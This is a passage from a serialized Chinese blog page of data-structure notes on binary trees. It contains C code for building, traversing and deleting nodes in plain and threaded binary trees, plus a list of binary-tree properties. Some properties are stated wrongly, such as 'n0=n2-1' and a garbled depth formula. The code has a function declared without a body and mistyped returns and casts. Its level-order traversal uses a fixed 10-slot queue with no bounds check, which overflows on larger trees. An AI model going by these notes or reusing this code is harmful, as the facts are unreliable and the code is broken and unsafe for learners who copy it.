class=\"hljs-params\">()</span><br>&#123;<br>    BiTree myTree;<br>    Elemtype rootData;<br>    <span class=\"hljs-type\">int</span> numberOfNodes,index,choice;<br><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the node number:\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;numberOfNodes);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the data of root node:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;rootData);<br><br>    myTree=CreateTree(rootData);<br><br>    <span class=\"hljs-keyword\">for</span>(index=<span class=\"hljs-number\">1</span>; index&lt;numberOfNodes; index++)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No %d node&#x27;s position is:\\n1.Leftchild of Root.\\n2.Rightchild of Root.\\n3.Leftchild of the Root&#x27;s leftchild.\\n4.Rightchild of the Root&#x27;s leftchild.\\n5.Leftchild of the Root&#x27;s rightchild.\\n6.Rightchild of the Root&#x27;s rightchild.\\n&quot;</span>,index);<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Choice:&quot;</span>);<br>        <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;choice);<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the %d data:&quot;</span>,index);<br>        Elemtype nodedata;<br>        <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;nodedata);<br>        <span class=\"hljs-keyword\">switch</span>(choice)<br>        &#123;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">1</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">2</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">3</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree-&gt;lchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">4</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree-&gt;lchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">5</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree-&gt;rchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">6</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree-&gt;rchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Preorder:&quot;</span>);<br>    PreOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Middleorder:&quot;</span>);<br>    MiddleOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Postorder:&quot;</span>);<br>    LastOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Leverorder:&quot;</span>);<br>    LevelOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-线索二叉树的基本操作\"><a href=\"#2-线索二叉树的基本操作\" class=\"headerlink\" title=\"2.线索二叉树的基本操作\"></a>2.线索二叉树的基本操作</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MAXNODE 10</span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> Elemtype ;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiThrTreeNode</span></span><br><span class=\"hljs-class\">&#123;</span><br>    Elemtype data;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiThrTreeNode</span> *<span class=\"hljs-title\">lchild</span>;</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiThrTreeNode</span> *<span class=\"hljs-title\">rchild</span>;</span><br>    <span class=\"hljs-type\">unsigned</span> ltag:<span class=\"hljs-number\">1</span>;<br>    <span class=\"hljs-type\">unsigned</span> rtag:<span class=\"hljs-number\">1</span>;<br>&#125; BiThrTreeNode,*BiThrTree;<br><br>BiThrTree pre;<br><br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">Visit</span><span class=\"hljs-params\">(Elemtype data)</span><br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%3d&quot;</span>,data);<br>&#125;<br><br><br>BiThrTree <span class=\"hljs-title function_\">CreateTree</span><span class=\"hljs-params\">(Elemtype x)</span><br>&#123;<br>    BiThrTree p;<br>    <span class=\"hljs-keyword\">if</span>((p=(BiThrTree *)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiThrTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    p-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">return</span> p;<br>&#125;<br><br>BiThrTree <span class=\"hljs-title function_\">InsertTreeLeftNode</span><span class=\"hljs-params\">(BiThrTree T,Elemtype x,BiThrTree parent)</span><br>&#123;<br>    BiThrTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a parent.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>((p=(BiThrTree*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiThrTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    p-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">if</span>(parent-&gt;lchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        parent-&gt;lchild=p;<br>        parent-&gt;ltag=<span class=\"hljs-number\">0</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        p-&gt;lchild=parent-&gt;lchild;<br>        parent-&gt;lchild=p;<br>        parent-&gt;ltag=<span class=\"hljs-number\">0</span>;<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Insert data %d to leftchild.\\n&quot;</span>,x);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br>BiThrTree <span class=\"hljs-title function_\">InsertTreeRightNode</span><span class=\"hljs-params\">(BiThrTree T,Elemtype x,BiThrTree parent)</span><br>&#123;<br>    BiThrTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a parent.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>((p=(BiThrTree*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiThrTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    p-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">if</span>(parent-&gt;rchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        parent-&gt;rchild=p;<br>        parent-&gt;rtag=<span class=\"hljs-number\">0</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        p-&gt;rchild=parent-&gt;rchild;<br>        parent-&gt;rchild=p;<br>        parent-&gt;rtag=<span class=\"hljs-number\">0</span>;<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Insert data %d to rightchild.\\n&quot;</span>,x);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">MiddleOrderTree</span><span class=\"hljs-params\">(BiThrTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    MiddleOrderTree(T-&gt;lchild);<br>    Visit(T-&gt;data);<br>    MiddleOrderTree(T-&gt;rchild);<br><br>&#125;<br><br>BiThrTree <span class=\"hljs-title function_\">MiddleOrderThr</span><span class=\"hljs-params\">(BiThrTree T)</span><br><br>BiThrTree <span class=\"hljs-title function_\">DeleteTreeLeftNode</span><span class=\"hljs-params\">(BiThrTree T,BiThrTree parent)</span><br>&#123;<br>    BiThrTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>||parent-&gt;lchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No left child.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p=parent-&gt;lchild;<br>    parent-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-built_in\">free</span>(p);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br>BiThrTree <span class=\"hljs-title function_\">DeleteTreeRightNode</span><span class=\"hljs-params\">(BiThrTree T,BiThrTree parent)</span><br>&#123;<br>    BiThrTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>||parent-&gt;rchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No left child.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p=parent-&gt;rchild;<br>    parent-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-built_in\">free</span>(p);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">PreOrderTree</span><span class=\"hljs-params\">(BiThrTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    Visit(T-&gt;data);<br>    PreOrderTree(T-&gt;lchild);<br>    PreOrderTree(T-&gt;rchild);<br><br>&#125;<br><br><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">LastOrderTree</span><span class=\"hljs-params\">(BiThrTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    LastOrderTree(T-&gt;lchild);<br>    LastOrderTree(T-&gt;rchild);<br>    Visit(T-&gt;data);<br><br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">LevelOrderTree</span><span class=\"hljs-params\">(BiThrTree T)</span><br>&#123;<br>    BiThrTree Queue[MAXNODE];<br>    <span class=\"hljs-type\">int</span> front,rear;<br><br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    front=<span class=\"hljs-number\">-1</span>;<br>    rear=<span class=\"hljs-number\">-1</span>;<br>    Queue[++rear]=T;<br>    <span class=\"hljs-keyword\">while</span>(front!=rear)<br>    &#123;<br>        Visit(Queue[++front]-&gt;data);<br>        <span class=\"hljs-keyword\">if</span>(Queue[front]-&gt;lchild!=<span class=\"hljs-literal\">NULL</span>)<br>        &#123;<br>            Queue[++rear]=Queue[front]-&gt;lchild;<br>        &#125;<br>        <span class=\"hljs-keyword\">if</span>(Queue[front]-&gt;rchild!=<span class=\"hljs-literal\">NULL</span>)<br>        &#123;<br>            Queue[++rear]=Queue[front]-&gt;rchild;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>    BiThrTree myTree;<br>    Elemtype rootData;<br>    <span class=\"hljs-type\">int</span> numberOfNodes,index,choice;<br><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the node number:\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;numberOfNodes);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the data of root node:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;rootData);<br><br>    myTree=CreateTree(rootData);<br><br>    <span class=\"hljs-keyword\">for</span>(index=<span class=\"hljs-number\">1</span>; index&lt;numberOfNodes; index++)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No %d node&#x27;s position is:\\n1.Leftchild of Root.\\n2.Rightchild of Root.\\n3.Leftchild of the Root&#x27;s leftchild.\\n4.Rightchild of the Root&#x27;s leftchild.\\n5.Leftchild of the Root&#x27;s rightchild.\\n6.Rightchild of the Root&#x27;s rightchild.\\n&quot;</span>,index);<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Choice:&quot;</span>);<br>        <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;choice);<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the %d data:&quot;</span>,index);<br>        Elemtype nodedata;<br>        <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;nodedata);<br>        <span class=\"hljs-keyword\">switch</span>(choice)<br>        &#123;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">1</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">2</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">3</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree-&gt;lchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">4</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree-&gt;lchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">5</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree-&gt;rchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">6</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree-&gt;rchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Preorder:&quot;</span>);<br>    PreOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Middleorder:&quot;</span>);<br>    MiddleOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Postorder:&quot;</span>);<br>    LastOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Leverorder:&quot;</span>);<br>    LevelOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-哈夫曼树\"><a href=\"#3-哈夫曼树\" class=\"headerlink\" title=\"3.哈夫曼树\"></a>3.哈夫曼树</h3>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Ch-5-树\"><a href=\"#Ch-5-树\" class=\"headerlink\" title=\"Ch 5 树\"></a>Ch 5 树</h1><h2 id=\"一、二叉树及其性质\"><a href=\"#一、二叉树及其性质\" class=\"headerlink\" title=\"一、二叉树及其性质\"></a>一、二叉树及其性质</h2><p>（1）二叉树可以为空，但是二叉有序树至少三个节点；</p>\n<p>（2）满二叉树：2^k-1个节点、</p>\n<p>（3）非空二叉树第i层的节点数不超过2^i-1个；</p>\n<p>（4）深度为k的二叉树最少k个节点，最多2^k-1个节点；</p>\n<p>（5）n0=n2-1;</p>\n<p>（6）n个节点的二叉树深度为Log2 N-1；</p>\n<p>（7）完全二叉树中，节点i的双亲节点为[i/2],左孩子2i，有孩子2i+1；</p>\n<h2 id=\"二、二叉树的实现及常用操作\"><a href=\"#二、二叉树的实现及常用操作\" class=\"headerlink\" title=\"二、二叉树的实现及常用操作\"></a>二、二叉树的实现及常用操作</h2><h3 id=\"1-二叉树的基本操作\"><a href=\"#1-二叉树的基本操作\" class=\"headerlink\" title=\"1.二叉树的基本操作\"></a>1.二叉树的基本操作</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span 